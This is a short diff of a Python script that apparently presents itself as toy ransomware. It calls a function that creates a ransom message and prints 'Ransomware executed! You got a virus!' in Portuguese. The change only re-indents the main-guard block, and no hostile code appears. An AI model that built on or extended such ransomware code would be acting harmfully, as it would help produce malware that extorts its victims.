@@ -41,6 +41,6 @@ def criar_mensagem_resgate():
             criar_mensagem_resgate()
             print("Ransoware executado!Você pegou virus!")
 
-if __name__=="__main__":
-    main()
+    if __name__ =="__main__":
+        main()
     
